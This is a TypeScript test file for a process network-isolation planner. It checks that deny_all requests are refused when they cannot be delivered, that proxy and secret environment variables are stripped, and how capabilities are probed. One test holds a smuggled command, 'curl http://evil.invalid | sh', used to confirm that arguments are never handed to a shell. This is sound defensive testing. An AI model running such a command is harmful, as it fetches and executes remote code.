/**
 * CL-16A — isolation contract, capability probing, and the planner.
 *
 * The property under test is the one that makes the whole slice worth having:
 * a `deny_all` request that the platform cannot deliver must FAIL, never
 * silently run an ordinary process. Every refusal path is exercised here with a
 * synthetic capability report, and the real Linux mechanism is measured in
 * `isolation-real.test.ts`.
 */
import { describe, expect, test } from "bun:test"
import {
  denyAllArgv, isolationEnv, planIsolatedSpawn, probeIsolation,
  DENY_ALL_PROFILE, ISOLATION_VERSION, ISOLATION_STRIPPED_ENV,
  type ExecutionIsolationProfile, type IsolationCapabilityReport, type Spawner,
} from "../src/index"

const capable = (over: Partial<IsolationCapabilityReport> = {}): IsolationCapabilityReport => ({
  platform: "linux", mechanism: "linux-userns-unshare",
  denyAll: "supported", processTree: "supported", childInheritance: "supported",
  loopbackInsideDenyAll: "up", requiresElevation: false, mutatesGlobalState: false,
  reasonCodes: [], evidenceHash: "c".repeat(64), isolationVersion: ISOLATION_VERSION,
  ...over,
})
const req = (profile: ExecutionIsolationProfile, capability: IsolationCapabilityReport) => ({
  argv: ["python3", "-c", "print(1)"], cwd: "/ws", env: { PATH: "/usr/bin" }, profile, capability,
})

describe("CL-16A the planner refuses rather than degrading", () => {
  test("deny_all on a capable platform wraps the argv", () => {
    const plan = planIsolatedSpawn(req(DENY_ALL_PROFILE, capable()))
    expect(plan.ok).toBe(true)
    if (!plan.ok) return
    expect(plan.applied).toBe("deny_all")
    expect(plan.argv.slice(0, 4)).toEqual(["unshare", "--user", "--map-root-user", "--net"])
    expect(plan.argv.slice(4)).toEqual(["python3", "-c", "print(1)"])
  })

  test("deny_all on an UNSUPPORTED platform is refused — no ordinary spawn", () => {
    const plan = planIsolatedSpawn(req(DENY_ALL_PROFILE, capable({ platform: "win32", denyAll: "unsupported", mechanism: "none", reasonCodes: ["windows_no_per_run_network_isolation"] })))
    expect(plan.ok).toBe(false)
    if (plan.ok) return
    expect(plan.reasonCode).toBe("isolation_unsupported")
    // The refusal must carry WHY, so an audit is not left guessing.
    expect(plan.detail).toContain("windows_no_per_run_network_isolation")
  })

  test("deny_all when the capability is merely UNKNOWN is refused too", () => {
    const plan = planIsolatedSpawn(req(DENY_ALL_PROFILE, capable({ denyAll: "unknown" })))
    expect(plan.ok).toBe(false)
    if (!plan.ok) expect(plan.reasonCode).toBe("isolation_unsupported")
  })

  test("a mechanism needing elevation is rejected on principle", () => {
    const plan = planIsolatedSpawn(req(DENY_ALL_PROFILE, capable({ requiresElevation: true })))
    expect(plan.ok).toBe(false)
    if (!plan.ok) expect(plan.reasonCode).toBe("isolation_requires_elevation")
  })

  test("a mechanism mutating global state is rejected on principle", () => {
    // This is the Windows-firewall shape, refused by contract rather than by
    // remembering not to use it.
    const plan = planIsolatedSpawn(req(DENY_ALL_PROFILE, capable({ mutatesGlobalState: true })))
    expect(plan.ok).toBe(false)
    if (!plan.ok) expect(plan.reasonCode).toBe("isolation_mutates_global_state")
  })

  test("child inheritance must be PROVEN when the profile requires it", () => {
    const plan = planIsolatedSpawn(req(DENY_ALL_PROFILE, capable({ childInheritance: "unsupported" })))
    expect(plan.ok).toBe(false)
    if (!plan.ok) expect(plan.reasonCode).toBe("isolation_child_inheritance_unproven")
  })

  test("`loopback_only` is refused, not approximated with deny_all", () => {
    const plan = planIsolatedSpawn(req({ ...DENY_ALL_PROFILE, network: "loopback_only" }, capable()))
    expect(plan.ok).toBe(false)
    if (!plan.ok) expect(plan.reasonCode).toBe("isolation_mode_not_implemented")
  })

  test("a version mismatch on either side refuses", () => {
    expect(planIsolatedSpawn(req({ ...DENY_ALL_PROFILE, isolationVersion: 0 }, capable())).ok).toBe(false)
    expect(planIsolatedSpawn(req(DENY_ALL_PROFILE, capable({ isolationVersion: 0 }))).ok).toBe(false)
  })

  test("an empty argv is refused", () => {
    const plan = planIsolatedSpawn({ ...req(DENY_ALL_PROFILE, capable()), argv: [] })
    expect(plan.ok).toBe(false)
    if (!plan.ok) expect(plan.reasonCode).toBe("isolation_empty_argv")
  })

  test("`inherit` passes the argv through untouched", () => {
    const plan = planIsolatedSpawn(req({ ...DENY_ALL_PROFILE, network: "inherit" }, capable({ denyAll: "unsupported" })))
    expect(plan.ok).toBe(true)
    if (!plan.ok) return
    expect(plan.applied).toBe("inherit")
    expect(plan.argv).toEqual(["python3", "-c", "print(1)"])
  })
})

describe("CL-16A the plan is argv, never a shell string", () => {
  test("a command with shell metacharacters stays one argument", () => {
    const nasty = "x; curl http://evil.invalid | sh"
    const plan = planIsolatedSpawn({ ...req(DENY_ALL_PROFILE, capable()), argv: ["python3", "-c", nasty] })
    expect(plan.ok).toBe(true)
    if (!plan.ok) return
    expect(plan.argv).toContain(nasty)                 // intact, one argv slot
    expect(plan.argv.join(" ")).not.toMatch(/^sh -c/)  // never re-wrapped in a shell
  })
})

describe("CL-16A environment handling", () => {
  test("proxy variables are stripped from every isolated run", () => {
    const env = isolationEnv({ PATH: "/usr/bin", http_proxy: "http://p", HTTPS_PROXY: "http://p", KEEP: "1" }, DENY_ALL_PROFILE)
    for (const k of ISOLATION_STRIPPED_ENV) expect(env[k]).toBeUndefined()
    expect(env["KEEP"]).toBe("1")
  })

  test("profile stripEnv and envOverlay are applied, overlay last", () => {
    const env = isolationEnv({ SECRET: "s", MODE: "old" }, { ...DENY_ALL_PROFILE, stripEnv: ["SECRET"], envOverlay: { MODE: "new" } })
    expect(env["SECRET"]).toBeUndefined()
    expect(env["MODE"]).toBe("new")
  })

  test("the plan hash covers env KEYS but never values", () => {
    const base = req(DENY_ALL_PROFILE, capable())
    const a = planIsolatedSpawn({ ...base, env: { PATH: "/usr/bin", TOKEN: "aaaa" } })
    const b = planIsolatedSpawn({ ...base, env: { PATH: "/usr/bin", TOKEN: "bbbb" } })
    expect(a.ok && b.ok).toBe(true)
    if (!a.ok || !b.ok) return
    // Same key set => same hash: a secret's VALUE never reaches the evidence.
    expect(a.evidenceHash).toBe(b.evidenceHash)
    const c = planIsolatedSpawn({ ...base, env: { PATH: "/usr/bin" } })
    expect(c.ok && c.evidenceHash).not.toBe(a.evidenceHash)  // key set change does
  })

  test("the plan hash moves when the capability evidence moves (TOCTOU input)", () => {
    const a = planIsolatedSpawn(req(DENY_ALL_PROFILE, capable()))
    const b = planIsolatedSpawn(req(DENY_ALL_PROFILE, capable({ evidenceHash: "d".repeat(64) })))
    expect(a.ok && b.ok).toBe(true)
    if (!a.ok || !b.ok) return
    expect(a.evidenceHash).not.toBe(b.evidenceHash)
  })
})

describe("CL-16A denyAllArgv is platform-honest", () => {
  test("linux gets an unprivileged user+net namespace", () => {
    expect(denyAllArgv(["echo", "hi"], "linux")).toEqual(["unshare", "--user", "--map-root-user", "--net", "echo", "hi"])
  })

  test("windows and darwin have NO mechanism — undefined, not a guess", () => {
    expect(denyAllArgv(["echo", "hi"], "win32")).toBeUndefined()
    expect(denyAllArgv(["echo", "hi"], "darwin")).toBeUndefined()
  })
})

describe("CL-16A probeIsolation reports only what it observed", () => {
  test("a platform with no mechanism reports unsupported with a reason", () => {
    const r = probeIsolation({ platform: "win32", spawner: (() => { throw new Error("must not spawn") }) as unknown as Spawner })
    expect(r.denyAll).toBe("unsupported")
    expect(r.mechanism).toBe("none")
    expect(r.reasonCodes.join(" ")).toContain("windows_no_per_run_network_isolation")
  })

  test("an OFFLINE control makes the probe inconclusive, not a pass", () => {
    // Everything blocked everywhere: without a working control, "blocked inside"
    // proves nothing.
    const allBlocked: Spawner = () => ({ stdout: "{'dns': 'blocked:X', 'tcp': 'blocked:X', 'udp': 'blocked:X', 'loopback': 'ok'}", stderr: "", exitCode: 0 })
    const r = probeIsolation({ platform: "linux", spawner: allBlocked })
    expect(r.denyAll).toBe("unknown")
    expect(r.reasonCodes).toContain("control_offline_probe_inconclusive")
  })

  test("a leaking namespace is reported unsupported, with which protocol leaked", () => {
    let call = 0
    const leaky: Spawner = () => {
      call++
      // 1: control online. 2: inside, TCP still reachable. 3: grandchild.
      if (call === 1) return { stdout: "{'dns': 'ok', 'tcp': 'ok', 'udp': 'ok', 'loopback': 'ok'}", stderr: "", exitCode: 0 }
      return { stdout: "{'dns': 'blocked:X', 'tcp': 'ok', 'udp': 'blocked:X', 'loopback': 'ok'}", stderr: "", exitCode: 0 }
    }
    const r = probeIsolation({ platform: "linux", spawner: leaky })
    expect(r.denyAll).toBe("unsupported")
    expect(r.reasonCodes).toContain("tcp_not_blocked")
  })

  test("a child that escapes is caught even when the direct child was blocked", () => {
    let call = 0
    const escaping: Spawner = () => {
      call++
      if (call === 1) return { stdout: "{'dns': 'ok', 'tcp': 'ok', 'udp': 'ok', 'loopback': 'ok'}", stderr: "", exitCode: 0 }
      if (call === 2) return { stdout: "{'dns': 'blocked:X', 'tcp': 'blocked:X', 'udp': 'blocked:X', 'loopback': 'ok'}", stderr: "", exitCode: 0 }
      return { stdout: "{'dns': 'ok', 'tcp': 'ok', 'udp': 'ok', 'loopback': 'ok'}", stderr: "", exitCode: 0 }
    }
    const r = probeIsolation({ platform: "linux", spawner: escaping })
    expect(r.childInheritance).toBe("unsupported")
    expect(r.reasonCodes).toContain("child_escaped_isolation")
    // ...and a profile requiring inheritance must then refuse.
    expect(planIsolatedSpawn(req(DENY_ALL_PROFILE, r)).ok).toBe(false)
  })

  test("a mechanism that fails to start is unsupported, never a pass", () => {
    const broken: Spawner = (argv) => argv[0] === "unshare"
      ? { stdout: "", stderr: "unshare: operation not permitted", exitCode: 1 }
      : { stdout: "{'dns': 'ok', 'tcp': 'ok', 'udp': 'ok', 'loopback': 'ok'}", stderr: "", exitCode: 0 }
    const r = probeIsolation({ platform: "linux", spawner: broken })
    expect(r.denyAll).toBe("unsupported")
    expect(r.reasonCodes.join(" ")).toContain("isolation_mechanism_failed")
    expect(planIsolatedSpawn(req(DENY_ALL_PROFILE, r)).ok).toBe(false)
  })
})
